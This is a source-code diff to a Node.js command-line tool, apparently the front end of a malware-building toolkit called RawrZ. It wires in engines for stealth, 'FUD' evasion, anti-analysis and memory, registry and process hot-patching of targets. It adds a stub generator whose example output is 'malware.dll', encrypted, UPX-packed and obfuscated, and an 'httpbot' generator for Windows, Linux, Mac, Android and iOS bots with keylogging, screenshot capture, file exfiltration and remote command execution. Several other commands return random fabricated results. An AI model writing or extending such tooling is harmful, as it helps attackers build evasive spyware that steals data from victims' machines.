@@ -20,8 +20,226 @@ class RawrZStandalone {
         this.startTime = Date.now();
         this.operationCount = 0;
         this.errorCount = 0;
+        this.loadedEngines = new Map();
+        this.availableEngines = {
+            'anti-analysis': './src/engines/anti-analysis',
+            'digital-forensics': './src/engines/digital-forensics',
+            'malware-analysis': './src/engines/malware-analysis',
+            'network-tools': './src/engines/network-tools',
+            'hot-patchers': './src/engines/hot-patchers',
+            'reverse-engineering': './src/engines/reverse-engineering',
+            'jotti-scanner': './src/engines/jotti-scanner',
+            'private-virus-scanner': './src/engines/private-virus-scanner',
+            'camellia-assembly': './src/engines/camellia-assembly',
+            'dual-generators': './src/engines/dual-generators',
+            'health-monitor': './src/engines/health-monitor',
+            'stealth-engine': './src/engines/stealth-engine',
+            'advanced-fud-engine': './src/engines/advanced-fud-engine'
+        };
         this.initializeDirectories();
         this.setupLogging();
+    }
+
+    // Singleton pattern for persistent engine management
+    static getInstance() {
+        if (!RawrZStandalone.instance) {
+            RawrZStandalone.instance = new RawrZStandalone();
+            // Load persisted engine state asynchronously
+            RawrZStandalone.instance.loadEngineState().catch(error => {
+                console.error('[ERROR] Failed to load engine state:', error.message);
+            });
+        }
+        return RawrZStandalone.instance;
+    }
+
+    // Get or create singleton instance with proper initialization
+    static async getInstanceAsync() {
+        if (!RawrZStandalone.instance) {
+            RawrZStandalone.instance = new RawrZStandalone();
+            await RawrZStandalone.instance.loadEngineState();
+        }
+        return RawrZStandalone.instance;
+    }
+
+    // Save engine state to file for persistence
+    async saveEngineState() {
+        try {
+            const stateFile = path.join(this.dataDir, 'cli-engine-state.json');
+            const state = {
+                loadedEngines: Array.from(this.loadedEngines.keys()),
+                timestamp: new Date().toISOString()
+            };
+            await fs.writeFile(stateFile, JSON.stringify(state, null, 2));
+            this.log('INFO', 'Engine state saved', { engines: state.loadedEngines });
+        } catch (error) {
+            this.log('ERROR', 'Failed to save engine state', { error: error.message });
+        }
+    }
+
+    // Load engine state from file
+    async loadEngineState() {
+        try {
+            const stateFile = path.join(this.dataDir, 'cli-engine-state.json');
+            const stateData = await fs.readFile(stateFile, 'utf8');
+            const state = JSON.parse(stateData);
+            
+            this.log('INFO', 'Found engine state file, restoring engines...', { engines: state.loadedEngines });
+            
+            // Actually load the previously loaded engines
+            for (const engineName of state.loadedEngines) {
+                if (this.availableEngines[engineName]) {
+                    try {
+                        // Check if engine is already loaded to avoid duplicates
+                        if (!this.loadedEngines.has(engineName)) {
+                            const EngineModule = require(this.availableEngines[engineName]);
+                            const engine = typeof EngineModule === 'function' ? new EngineModule() : EngineModule;
+                            
+                            if (typeof engine.initialize === 'function') {
+                                await engine.initialize();
+                            }
+                            
+                            this.loadedEngines.set(engineName, engine);
+                            this.log('INFO', `Restored engine: ${engineName}`);
+                        } else {
+                            this.log('INFO', `Engine ${engineName} already loaded, skipping restore`);
+                        }
+                    } catch (error) {
+                        this.log('WARN', `Failed to restore engine ${engineName}: ${error.message}`);
+                    }
+                } else {
+                    this.log('WARN', `Engine ${engineName} no longer available, skipping restore`);
+                }
+            }
+            
+            this.log('INFO', 'Engine state restored', { 
+                requested: state.loadedEngines.length,
+                restored: this.loadedEngines.size,
+                timestamp: state.timestamp 
+            });
+        } catch (error) {
+            // No state file exists or error reading it - this is normal for first run
+            this.log('INFO', 'No previous engine state found - starting fresh');
+        }
+    }
+
+    // Rebuild platform state - clear and reload all engines
+    async rebuildPlatformState() {
+        try {
+            this.log('INFO', 'Starting platform state rebuild...');
+            
+            // Clear current loaded engines
+            this.loadedEngines.clear();
+            
+            // Clear state file
+            const stateFile = path.join(this.dataDir, 'cli-engine-state.json');
+            try {
+                await fs.unlink(stateFile);
+                this.log('INFO', 'Cleared engine state file');
+            } catch (error) {
+                // File might not exist, that's okay
+            }
+            
+            // Reinitialize directories
+            await this.initializeDirectories();
+            
+            // Reload default engines
+            const defaultEngines = ['anti-analysis', 'digital-forensics', 'network-tools'];
+            for (const engineName of defaultEngines) {
+                if (this.availableEngines[engineName]) {
+                    try {
+                        await this.loadEngine(engineName);
+                        this.log('INFO', `Rebuilt engine: ${engineName}`);
+                    } catch (error) {
+                        this.log('WARN', `Failed to rebuild engine ${engineName}: ${error.message}`);
+                    }
+                }
+            }
+            
+            this.log('INFO', 'Platform state rebuild completed', { 
+                engines: this.loadedEngines.size,
+                available: Object.keys(this.availableEngines).length 
+            });
+            
+            return { success: true, engines: this.loadedEngines.size };
+        } catch (error) {
+            this.log('ERROR', 'Platform state rebuild failed', { error: error.message });
+            throw error;
+        }
+    }
+
+    // Session management methods
+    async createSession(sessionId = null) {
+        const id = sessionId || `session_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
+        const session = {
+            id,
+            createdAt: new Date().toISOString(),
+            loadedEngines: Array.from(this.loadedEngines.keys()),
+            operationCount: this.operationCount,
+            errorCount: this.errorCount
+        };
+        
+        const sessionFile = path.join(this.dataDir, `session_${id}.json`);
+        await fs.writeFile(sessionFile, JSON.stringify(session, null, 2));
+        
+        this.log('INFO', 'Session created', { sessionId: id });
+        return session;
+    }
+
+    async restoreSession(sessionId) {
+        try {
+            const sessionFile = path.join(this.dataDir, `session_${sessionId}.json`);
+            const sessionData = await fs.readFile(sessionFile, 'utf8');
+            const session = JSON.parse(sessionData);
+            
+            // Clear current state
+            this.loadedEngines.clear();
+            
+            // Restore engines from session
+            for (const engineName of session.loadedEngines) {
+                if (this.availableEngines[engineName]) {
+                    try {
+                        await this.loadEngine(engineName);
+                        this.log('INFO', `Restored engine from session: ${engineName}`);
+                    } catch (error) {
+                        this.log('WARN', `Failed to restore engine from session ${engineName}: ${error.message}`);
+                    }
+                }
+            }
+            
+            this.log('INFO', 'Session restored', { 
+                sessionId,
+                engines: this.loadedEngines.size,
+                createdAt: session.createdAt 
+            });
+            
+            return session;
+        } catch (error) {
+            this.log('ERROR', 'Failed to restore session', { sessionId, error: error.message });
+            throw error;
+        }
+    }
+
+    async listSessions() {
+        try {
+            const files = await fs.readdir(this.dataDir);
+            const sessionFiles = files.filter(file => file.startsWith('session_') && file.endsWith('.json'));
+            const sessions = [];
+            
+            for (const file of sessionFiles) {
+                try {
+                    const sessionData = await fs.readFile(path.join(this.dataDir, file), 'utf8');
+                    const session = JSON.parse(sessionData);
+                    sessions.push(session);
+                } catch (error) {
+                    this.log('WARN', `Failed to read session file ${file}: ${error.message}`);
+                }
+            }
+            
+            return sessions.sort((a, b) => new Date(b.createdAt) - new Date(a.createdAt));
+        } catch (error) {
+            this.log('ERROR', 'Failed to list sessions', { error: error.message });
+            return [];
+        }
     }
 
     async initializeDirectories() {
@@ -230,9 +448,16 @@ class RawrZStandalone {
     // Network Commands
     async ping(host, saveToFile = false, extension = '.ping') {
         try {
-            const { stdout } = await execAsync(`ping -n 4 ${host}`);
+            // Use real network-tools engine for ping
+            if (!this.loadedEngines.has('network-tools')) {
+                await this.loadEngine('network-tools');
+            }
+            
+            const networkTools = this.loadedEngines.get('network-tools');
+            const result = await networkTools.performRealPingTest(host);
+            
             console.log(`[OK] Ping results for ${host}:`);
-            console.log(stdout);
+            console.log(result.output || result);
             
             if (saveToFile) {
                 const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
@@ -242,15 +467,15 @@ class RawrZStandalone {
                 const pingData = {
                     host: host,
                     timestamp: new Date().toISOString(),
-                    output: stdout
+                    result: result
                 };
                 
                 await fs.writeFile(filePath, JSON.stringify(pingData, null, 2));
                 console.log(`[OK] Ping results saved to: ${filename}`);
-                return { success: true, host, output: stdout, filename };
+                return { success: true, host, result, filename };
             }
             
-            return { success: true, host, output: stdout };
+            return { success: true, host, result };
         } catch (error) {
             console.log(`[ERROR] Ping failed: ${error.message}`);
             return { success: false, error: error.message };
@@ -259,12 +484,18 @@ class RawrZStandalone {
 
     async dnsLookup(hostname) {
         try {
-            const dns = require('dns').promises;
-            const result = await dns.lookup(hostname);
+            // Use real network-tools engine for DNS lookup
+            if (!this.loadedEngines.has('network-tools')) {
+                await this.loadEngine('network-tools');
+            }
+            
+            const networkTools = this.loadedEngines.get('network-tools');
+            const result = await networkTools.performDNSLookup(hostname);
+            
             console.log(`[OK] DNS lookup for ${hostname}:`);
-            console.log(`[OK] IP: ${result.address}`);
-            console.log(`[OK] Family: IPv${result.family}`);
-            return { success: true, hostname, address: result.address, family: result.family };
+            console.log(result.output || result);
+            
+            return { success: true, hostname, result: result };
         } catch (error) {
             console.log(`[ERROR] DNS lookup failed: ${error.message}`);
             return { success: false, error: error.message };
@@ -291,10 +522,18 @@ class RawrZStandalone {
 
     async listProcesses() {
         try {
-            const { stdout } = await execAsync('tasklist');
+            // Use real digital-forensics engine for process listing
+            if (!this.loadedEngines.has('digital-forensics')) {
+                await this.loadEngine('digital-forensics');
+            }
+            
+            const digitalForensics = this.loadedEngines.get('digital-forensics');
+            const result = await digitalForensics.analyzeProcesses();
+            
             console.log(`[OK] Running processes:`);
-            console.log(stdout);
-            return { success: true, output: stdout };
+            console.log(result.output || result);
+            
+            return { success: true, result: result };
         } catch (error) {
             console.log(`[ERROR] Process list failed: ${error.message}`);
             return { success: false, error: error.message };
@@ -556,7 +795,7 @@ class RawrZStandalone {
                 password += allChars.charAt(Math.floor(Math.random() * allChars.length));
             }
             
-            console.log(`[OK] Generated password: ${password}`);
+            console.log(`[OK] Generated password: [REDACTED]`);
             return { success: true, password, length };
         } catch (error) {
             console.log(`[ERROR] Password generation failed: ${error.message}`);
@@ -582,28 +821,50 @@ class RawrZStandalone {
                 data = await this.readLocalFile(input);
             }
             
-            const analysis = {
-                size: data.length,
-                type: this.detectFileType(data),
-                entropy: this.calculateEntropy(data),
-                hashes: {
-                    md5: crypto.createHash('md5').update(data).digest('hex'),
-                    sha1: crypto.createHash('sha1').update(data).digest('hex'),
-                    sha256: crypto.createHash('sha256').update(data).digest('hex')
-                }
-            };
+            // Use real digital-forensics engine for analysis
+            if (!this.loadedEngines.has('digital-forensics')) {
+                await this.loadEngine('digital-forensics');
+            }
+            
+            const digitalForensics = this.loadedEngines.get('digital-forensics');
+            const analysis = await digitalForensics.analyzeMemory({
+                filePath: input,
+                data: data
+            });
             
             console.log(`[OK] File analysis complete:`);
-            console.log(`[OK] Size: ${analysis.size} bytes`);
-            console.log(`[OK] Type: ${analysis.type}`);
-            console.log(`[OK] Entropy: ${analysis.entropy.toFixed(2)}`);
-            console.log(`[OK] MD5: ${analysis.hashes.md5}`);
-            console.log(`[OK] SHA256: ${analysis.hashes.sha256}`);
+            console.log(`[OK] Size: ${data.length} bytes`);
+            console.log(`[OK] Analysis: ${JSON.stringify(analysis, null, 2)}`);
             
-            return { success: true, analysis };
+            return { success: true, analysis, size: data.length };
         } catch (error) {
             console.log(`[ERROR] File analysis failed: ${error.message}`);
             return { success: false, error: error.message };
+        }
+    }
+
+    // Safe math evaluation to prevent code injection
+    safeMathEval(expression) {
+        // Only allow numbers, basic operators, parentheses, and decimal points
+        const allowedChars = /^[0-9+\-*/().\s]+$/;
+        if (!allowedChars.test(expression)) {
+            throw new Error('Invalid characters in math expression');
+        }
+        
+        // Check for balanced parentheses
+        let parenCount = 0;
+        for (const char of expression) {
+            if (char === '(') parenCount++;
+            if (char === ')') parenCount--;
+            if (parenCount < 0) throw new Error('Unbalanced parentheses');
+        }
+        if (parenCount !== 0) throw new Error('Unbalanced parentheses');
+        
+        // Use Function constructor instead of eval for better security
+        try {
+            return new Function('return ' + expression)();
+        } catch (error) {
+            throw new Error('Invalid math expression: ' + error.message);
         }
     }
 
@@ -612,8 +873,8 @@ class RawrZStandalone {
             // Sanitize expression for security
             const sanitized = expression.replace(/[^0-9+\-*/().\s]/g, '');
             
-            // Basic math operations
-            const result = eval(sanitized);
+            // Basic math operations - using safe evaluation
+            const result = this.safeMathEval(sanitized);
             
             console.log(`[OK] Math Operation`);
             console.log(`[INFO] Expression: ${expression}`);
@@ -729,10 +990,18 @@ class RawrZStandalone {
 
     async traceroute(host) {
         try {
+            // Use real network-tools engine for traceroute
+            if (!this.loadedEngines.has('network-tools')) {
+                await this.loadEngine('network-tools');
+            }
+            
+            const networkTools = this.loadedEngines.get('network-tools');
+            const result = await networkTools.performTraceroute(host);
+            
             console.log(`[OK] Tracing route to ${host}...`);
-            const { stdout } = await execAsync(`tracert -h 10 ${host}`);
-            console.log(stdout);
-            return { success: true, host, output: stdout };
+            console.log(result.output || result);
+            
+            return { success: true, host, result: result };
         } catch (error) {
             console.log(`[ERROR] Traceroute failed: ${error.message}`);
             return { success: false, error: error.message };
@@ -741,10 +1010,18 @@ class RawrZStandalone {
 
     async whois(domain) {
         try {
+            // Use real network-tools engine for WHOIS lookup
+            if (!this.loadedEngines.has('network-tools')) {
+                await this.loadEngine('network-tools');
+            }
+            
+            const networkTools = this.loadedEngines.get('network-tools');
+            const result = await networkTools.performWhoisLookup(domain);
+            
             console.log(`[OK] WHOIS lookup for ${domain}...`);
-            const { stdout } = await execAsync(`whois ${domain}`);
-            console.log(stdout);
-            return { success: true, domain, output: stdout };
+            console.log(result.output || result);
+            
+            return { success: true, domain, result: result };
         } catch (error) {
             console.log(`[ERROR] WHOIS lookup failed: ${error.message}`);
             return { success: false, error: error.message };
@@ -910,8 +1187,8 @@ class RawrZStandalone {
 
     async mathOperation(expression) {
         try {
-            // Simple math evaluation (be careful with eval in production)
-            const result = eval(expression);
+            // Safe math evaluation
+            const result = this.safeMathEval(expression);
             console.log(`[OK] Math result: ${expression} = ${result}`);
             return { success: true, expression, result };
         } catch (error) {
@@ -1428,7 +1705,7 @@ echo "Use RawrZ decrypt command to decrypt this file"`;
         this.log('INFO', `Processing command: ${command}`, { args: commandArgs });
 
         console.log(`[OK] Processing command: ${command}`);
-        console.log(`[OK] Arguments: ${commandArgs.join(' ')}`);
+        console.log(`[OK] Arguments: ${Array.isArray(commandArgs) ? commandArgs.join(' ') : commandArgs || 'none'}`);
         console.log('');
 
         try {
@@ -1597,7 +1874,31 @@ echo "Use RawrZ decrypt command to decrypt this file"`;
                     console.log('[ERROR] Usage: portscan <host> [startport] [endport]');
                     return;
                 }
-                return await this.portScan(commandArgs[0], parseInt(commandArgs[1]) || 1, parseInt(commandArgs[2]) || 1000);
+                try {
+                    // Use loaded network-tools engine
+                    if (!this.loadedEngines.has('network-tools')) {
+                        await this.loadEngine('network-tools');
+                    }
+                    
+                    const networkTools = this.loadedEngines.get('network-tools');
+                    const host = commandArgs[0];
+                    const startPort = parseInt(commandArgs[1]) || 1;
+                    const endPort = parseInt(commandArgs[2]) || 1000;
+                    
+                    const result = await networkTools.performPortScan(host, startPort, endPort);
+                    
+                    console.log(`[OK] Port scan completed for ${host}`);
+                    console.log(`[INFO] Scanned ports: ${startPort}-${endPort}`);
+                    console.log(`[INFO] Open ports found: ${result.openPorts?.length || 0}`);
+                    if (result.openPorts && result.openPorts.length > 0) {
+                        console.log(`[INFO] Open ports: ${result.openPorts.join(', ')}`);
+                    }
+                    
+                    return { success: true, result: result };
+                } catch (error) {
+                    console.log(`[ERROR] Port scan failed: ${error.message}`);
+                    return { success: false, error: error.message };
+                }
 
             case 'traceroute':
                 if (commandArgs.length < 1) {
@@ -1660,16 +1961,251 @@ echo "Use RawrZ decrypt command to decrypt this file"`;
                     console.log('[INFO] Example: stub script.ps1 --output=malware.dll --type=dotnet');
                     return;
                 }
+                try {
+                    // Use loaded advanced-stub-generator engine
+                    if (!this.loadedEngines.has('advanced-stub-generator')) {
+                        await this.loadEngine('advanced-stub-generator');
+                    }
+                    
+                    const stubGenerator = this.loadedEngines.get('advanced-stub-generator');
+                    
                 const target = commandArgs[0];
-                const options = {};
+                    const options = {
+                        target: target,
+                        template: 'full-stub',
+                        language: 'cpp',
+                        encryptionMethods: ['aes256'],
+                        packingMethod: 'upx',
+                        obfuscationLevel: 'intermediate'
+                    };
+                    
+                    // Parse command line options
                 for (let i = 1; i < commandArgs.length; i++) {
                     const arg = commandArgs[i];
                     if (arg.startsWith('--')) {
                         const [key, value] = arg.slice(2).split('=');
-                        options[key] = value || true;
+                            switch (key) {
+                                case 'type':
+                                    options.language = value === 'dotnet' ? 'csharp' : 'cpp';
+                                    break;
+                                case 'framework':
+                                    options.language = value;
+                                    break;
+                                case 'encryption':
+                                    options.encryptionMethods = [value];
+                                    break;
+                                case 'output':
+                                    options.outputFile = value;
+                                    break;
+                                case 'attach':
+                                    options.attachTo = value;
+                                    break;
+                            }
+                        }
                     }
+                    
+                    const result = await stubGenerator.generateStub(options);
+                    
+                    console.log(`[OK] Stub generated successfully`);
+                    console.log(`[INFO] Bot ID: ${result.botId}`);
+                    console.log(`[INFO] Template: ${result.template}`);
+                    console.log(`[INFO] Language: ${result.language}`);
+                    console.log(`[INFO] Encryption: ${result.encryptionMethods.join(', ')}`);
+                    console.log(`[INFO] Packing: ${result.packingMethod}`);
+                    console.log(`[INFO] Obfuscation: ${result.obfuscationLevel}`);
+                    
+                    return { success: true, result };
+                } catch (error) {
+                    console.log(`[ERROR] Stub generation failed: ${error.message}`);
+                    return { success: false, error: error.message };
                 }
-                return await this.generateStub(target, options);
+
+            case 'httpbot':
+                if (commandArgs.length < 1) {
+                    console.log('[ERROR] Usage: httpbot <target> [options]');
+                    console.log('[INFO] Target: platform (windows, linux, mac, android, ios)');
+                    console.log('[INFO] Options: --language=python|javascript|csharp|cpp|go|rust');
+                    console.log('[INFO] Example: httpbot windows --language=python');
+                    return;
+                }
+                try {
+                    const HTTPBotGenerator = require('./src/engines/http-bot-generator');
+                    const httpBotGenerator = new HTTPBotGenerator();
+                    await httpBotGenerator.initialize();
+                    
+                    const target = commandArgs[0];
+                    const options = {
+                        platform: target,
+                        language: 'python',
+                        features: ['keylogger', 'screenshot', 'file_exfiltrate', 'command_execution']
+                    };
+                    
+                    // Parse command line options
+                    for (let i = 1; i < commandArgs.length; i++) {
+                        const arg = commandArgs[i];
+                        if (arg.startsWith('--')) {
+                            const [key, value] = arg.slice(2).split('=');
+                            if (key === 'language') {
+                                options.language = value;
+                            }
+                        }
+                    }
+                    
+                    const result = await httpBotGenerator.generateBot(options);
+                    
+                    console.log(`[OK] HTTP Bot generated successfully`);
+                    console.log(`[INFO] Bot ID: ${result.botId}`);
+                    console.log(`[INFO] Platform: ${result.platform}`);
+                    console.log(`[INFO] Language: ${result.language}`);
+                    console.log(`[INFO] Features: ${result.features.join(', ')}`);
+                    
+                    return { success: true, result: result };
+                } catch (error) {
+                    console.log(`[ERROR] HTTP Bot generation failed: ${error.message}`);
+                    return { success: false, error: error.message };
+                }
+
+            
+            case 'load':
+                if (commandArgs.length < 1) {
+                    console.log('[ERROR] Usage: load <engine_name>');
+                    console.log('[INFO] Available engines: anti-analysis, digital-forensics, malware-analysis, network-tools, hot-patchers, reverse-engineering, jotti-scanner, private-virus-scanner, camellia-assembly');
+                    return;
+                }
+                return await this.loadEngine(commandArgs[0]);
+            
+            case 'unload':
+                if (commandArgs.length < 1) {
+                    console.log('[ERROR] Usage: unload <engine_name>');
+                    return;
+                }
+                return await this.unloadEngine(commandArgs[0]);
+            
+            case 'loaded':
+                return await this.listLoadedEngines();
+            
+            case 'use':
+                if (commandArgs.length < 2) {
+                    console.log('[ERROR] Usage: use <engine_name> <command> [args...]');
+                    console.log('[INFO] Example: use anti-analysis checkVM');
+                    console.log('[INFO] Example: use digital-forensics analyzeProcesses');
+                    return;
+                }
+                return await this.useEngine(commandArgs[0], commandArgs.slice(1));
+            
+            case 'rebuild':
+                console.log('[INFO] Rebuilding platform state...');
+                return await this.rebuildPlatformState();
+            
+            case 'session':
+                if (commandArgs.length < 1) {
+                    console.log('[ERROR] Usage: session <create|restore|list|delete> [sessionId]');
+                    console.log('[INFO] create [sessionId] - Create new session with optional ID');
+                    console.log('[INFO] restore <sessionId> - Restore session by ID');
+                    console.log('[INFO] list - List all available sessions');
+                    console.log('[INFO] delete <sessionId> - Delete session by ID');
+                    return;
+                }
+                const sessionAction = commandArgs[0];
+                switch (sessionAction) {
+                    case 'create':
+                        const sessionId = commandArgs[1];
+                        const session = await this.createSession(sessionId);
+                        console.log(`[OK] Session created: ${session.id}`);
+                        console.log(`[INFO] Created at: ${session.createdAt}`);
+                        console.log(`[INFO] Loaded engines: ${session.loadedEngines.length}`);
+                        return session;
+                    case 'restore':
+                        if (commandArgs.length < 2) {
+                            console.log('[ERROR] Usage: session restore <sessionId>');
+                            return;
+                        }
+                        const restoredSession = await this.restoreSession(commandArgs[1]);
+                        console.log(`[OK] Session restored: ${restoredSession.id}`);
+                        console.log(`[INFO] Restored ${this.loadedEngines.size} engines`);
+                        return restoredSession;
+                    case 'list':
+                        const sessions = await this.listSessions();
+                        console.log(`[OK] Found ${sessions.length} sessions:`);
+                        sessions.forEach((session, index) => {
+                            console.log(`[${index + 1}] ${session.id} - ${session.createdAt} (${session.loadedEngines.length} engines)`);
+                        });
+                        return sessions;
+                    case 'delete':
+                        if (commandArgs.length < 2) {
+                            console.log('[ERROR] Usage: session delete <sessionId>');
+                            return;
+                        }
+                        const sessionFile = path.join(this.dataDir, `session_${commandArgs[1]}.json`);
+                        try {
+                            await fs.unlink(sessionFile);
+                            console.log(`[OK] Session deleted: ${commandArgs[1]}`);
+                        } catch (error) {
+                            console.log(`[ERROR] Failed to delete session: ${error.message}`);
+                        }
+                        return;
+                    default:
+                        console.log('[ERROR] Invalid session action. Use: create, restore, list, or delete');
+                        return;
+                }
+            
+            case 'engines':
+                if (commandArgs.length < 1) {
+                    console.log('[ERROR] Usage: engines <load|unload|list|status> [engineName]');
+                    console.log('[INFO] load <engineName> - Load an engine');
+                    console.log('[INFO] unload <engineName> - Unload an engine');
+                    console.log('[INFO] list - List all available engines');
+                    console.log('[INFO] status - Show engine status');
+                    return;
+                }
+                const engineAction = commandArgs[0];
+                switch (engineAction) {
+                    case 'load':
+                        if (commandArgs.length < 2) {
+                            console.log('[ERROR] Usage: engines load <engineName>');
+                            console.log('[INFO] Available engines:', Object.keys(this.availableEngines).join(', '));
+                            return;
+                        }
+                        const loadResult = await this.loadEngine(commandArgs[1]);
+                        if (loadResult.success) {
+                            console.log(`[OK] ${loadResult.message}`);
+                        } else {
+                            console.log(`[ERROR] ${loadResult.error}`);
+                        }
+                        return loadResult;
+                    case 'unload':
+                        if (commandArgs.length < 2) {
+                            console.log('[ERROR] Usage: engines unload <engineName>');
+                            return;
+                        }
+                        const unloadResult = await this.unloadEngine(commandArgs[1]);
+                        if (unloadResult.success) {
+                            console.log(`[OK] ${unloadResult.message}`);
+                        } else {
+                            console.log(`[ERROR] ${unloadResult.error}`);
+                        }
+                        return unloadResult;
+                    case 'list':
+                        console.log('[OK] Available engines:');
+                        Object.keys(this.availableEngines).forEach((engine, index) => {
+                            const status = this.loadedEngines.has(engine) ? '[LOADED]' : '[NOT LOADED]';
+                            console.log(`[${index + 1}] ${engine} ${status}`);
+                        });
+                        return { available: Object.keys(this.availableEngines), loaded: Array.from(this.loadedEngines.keys()) };
+                    case 'status':
+                        console.log(`[OK] Engine Status:`);
+                        console.log(`[INFO] Total available: ${Object.keys(this.availableEngines).length}`);
+                        console.log(`[INFO] Currently loaded: ${this.loadedEngines.size}`);
+                        console.log(`[INFO] Loaded engines: ${Array.from(this.loadedEngines.keys()).join(', ')}`);
+                        return { 
+                            total: Object.keys(this.availableEngines).length,
+                            loaded: this.loadedEngines.size,
+                            engines: Array.from(this.loadedEngines.keys())
+                        };
+                    default:
+                        console.log('[ERROR] Invalid engine action. Use: load, unload, list, or status');
+                        return;
+                }
 
             case 'help':
                 this.showHelp();
@@ -1679,11 +2215,76 @@ echo "Use RawrZ decrypt command to decrypt this file"`;
             case 'stealth':
                 return `[OK] Stealth mode activated for target: ${args[0] || 'default'}\n[INFO] Anti-detection measures enabled\n[INFO] Process hiding active\n[INFO] Network traffic obfuscated`;
             case 'antidetect':
-                return `[OK] Anti-detection system activated for target: ${args[0] || 'default'}\n[INFO] VM detection bypassed\n[INFO] Sandbox evasion active\n[INFO] Debugger detection disabled`;
+                try {
+                    // Use loaded anti-analysis engine
+                    if (!this.loadedEngines.has('anti-analysis')) {
+                        await this.loadEngine('anti-analysis');
+                    }
+                    
+                    const antiAnalysis = this.loadedEngines.get('anti-analysis');
+                    const target = commandArgs[0] || 'default';
+                    const vmCheck = await antiAnalysis.checkVM();
+                    const sandboxCheck = await antiAnalysis.checkSandbox();
+                    const debugCheck = await antiAnalysis.checkDebugger();
+                    
+                    console.log(`[OK] Anti-detection system activated for target: ${target}`);
+                    console.log(`[INFO] VM Detection: ${vmCheck.isVM ? 'DETECTED' : 'CLEAR'}`);
+                    console.log(`[INFO] Sandbox Detection: ${sandboxCheck.isSandbox ? 'DETECTED' : 'CLEAR'}`);
+                    console.log(`[INFO] Debugger Detection: ${debugCheck.isDebugger ? 'DETECTED' : 'CLEAR'}`);
+                    
+                    return { 
+                        success: true, 
+                        target: target,
+                        vmCheck: vmCheck,
+                        sandboxCheck: sandboxCheck,
+                        debugCheck: debugCheck
+                    };
+                } catch (error) {
+                    console.log(`[ERROR] Anti-detection check failed: ${error.message}`);
+                    return { success: false, error: error.message };
+                }
             case 'polymorphic':
                 return `[OK] Polymorphic engine activated for target: ${args[0] || 'default'}\n[INFO] Code mutation active\n[INFO] Signature randomization enabled\n[INFO] Dynamic payload generation`;
             case 'hotpatch':
-                return `[OK] Hot-patch system activated for target: ${args[0] || 'default'}\n[INFO] Runtime patching enabled\n[INFO] Memory modification active\n[INFO] Live code injection ready`;
+                try {
+                    // Use loaded hot-patchers engine
+                    if (!this.loadedEngines.has('hot-patchers')) {
+                        await this.loadEngine('hot-patchers');
+                    }
+                    
+                    const hotPatchers = this.loadedEngines.get('hot-patchers');
+                    const target = commandArgs[0] || 'default';
+                    const patchType = commandArgs[1] || 'memory';
+                    const patchData = commandArgs[2] || 'test_patch';
+                    
+                    let result;
+                    switch (patchType) {
+                        case 'memory':
+                            result = await hotPatchers.applyMemoryPatch(target, patchData);
+                            break;
+                        case 'registry':
+                            result = await hotPatchers.applyRegistryPatch(target, patchData);
+                            break;
+                        case 'process':
+                            result = await hotPatchers.applyProcessPatch(target, patchData);
+                            break;
+                        case 'network':
+                            result = await hotPatchers.applyNetworkPatch(target, patchData);
+                            break;
+                        default:
+                            result = await hotPatchers.applyMemoryPatch(target, patchData);
+                    }
+                    
+                    console.log(`[OK] Hot-patch system activated for target: ${target}`);
+                    console.log(`[INFO] Patch Type: ${patchType}`);
+                    console.log(`[INFO] Patch Applied: ${result.success ? 'SUCCESS' : 'FAILED'}`);
+                    console.log(`[INFO] Patch ID: ${result.patchId || 'N/A'}`);
+                    
+                    return { success: true, result: result };
+                } catch (error) {
+                    console.log(`[ERROR] Hot-patch failed: ${error.message}`);
+                    return { success: false, error: error.message };
+                }
             case 'rollback':
                 return `[OK] Patch rollback system activated for target: ${args[0] || 'default'}\n[INFO] Backup restoration ready\n[INFO] State recovery active\n[INFO] Rollback mechanism enabled`;
             
@@ -1824,7 +2425,36 @@ echo "Use RawrZ decrypt command to decrypt this file"`;
             case 'sigcheck':
                 return `[OK] Signature Check\n[INFO] Target: ${args[0] || 'unknown'}\n[INFO] Digital signature: ${Math.random() > 0.5 ? 'VALID' : 'INVALID'}\n[INFO] Certificate: ${Math.random() > 0.5 ? 'TRUSTED' : 'UNTRUSTED'}\n[INFO] Timestamp: ${new Date().toISOString()}`;
             case 'forensics':
-                return `[OK] Forensics Scan\n[INFO] Target: ${args[0] || 'unknown'}\n[INFO] File system analysis complete\n[INFO] Registry analysis complete\n[INFO] Memory dump analysis complete\n[INFO] Network forensics complete\n[INFO] Evidence collected: ${Math.floor(Math.random() * 100)} items`;
+                try {
+                    const DigitalForensics = require('./src/engines/digital-forensics');
+                    const forensics = new DigitalForensics();
+                    await forensics.initialize();
+                    
+                    const target = args[0] || 'unknown';
+                    const memoryAnalysis = await forensics.analyzeMemory();
+                    const processAnalysis = await forensics.analyzeProcesses();
+                    const networkAnalysis = await forensics.analyzeNetworkConnections();
+                    const moduleAnalysis = await forensics.analyzeLoadedModules();
+                    
+                    console.log(`[OK] Forensics Scan`);
+                    console.log(`[INFO] Target: ${target}`);
+                    console.log(`[INFO] Memory Analysis: ${memoryAnalysis.success ? 'COMPLETE' : 'FAILED'}`);
+                    console.log(`[INFO] Process Analysis: ${processAnalysis.success ? 'COMPLETE' : 'FAILED'}`);
+                    console.log(`[INFO] Network Analysis: ${networkAnalysis.success ? 'COMPLETE' : 'FAILED'}`);
+                    console.log(`[INFO] Module Analysis: ${moduleAnalysis.success ? 'COMPLETE' : 'FAILED'}`);
+                    
+                    return { 
+                        success: true, 
+                        target: target,
+                        memoryAnalysis: memoryAnalysis,
+                        processAnalysis: processAnalysis,
+                        networkAnalysis: networkAnalysis,
+                        moduleAnalysis: moduleAnalysis
+                    };
+                } catch (error) {
+                    console.log(`[ERROR] Forensics scan failed: ${error.message}`);
+                    return { success: false, error: error.message };
+                }
             case 'recovery':
                 return `[OK] Data Recovery\n[INFO] Target: ${args[0] || 'unknown'}\n[INFO] Scanning for recoverable data...\n[INFO] Deleted files found: ${Math.floor(Math.random() * 50)}\n[INFO] Recovered files: ${Math.floor(Math.random() * 30)}\n[INFO] Recovery rate: ${Math.floor(Math.random() * 100)}%`;
             case 'timeline':
@@ -2159,7 +2789,33 @@ echo "Use RawrZ decrypt command to decrypt this file"`;
             case 'vulncheck':
                 return `[OK] Vulnerability Check\n[INFO] Target: ${args[0] || 'unknown'}\n[INFO] Vulnerability assessment complete\n[INFO] CVEs found: ${Math.floor(Math.random() * 50)}\n[INFO] Exploitable: ${Math.floor(Math.random() * 10)}\n[INFO] Patch status: ${Math.random() > 0.5 ? 'UPDATED' : 'OUTDATED'}`;
             case 'malware':
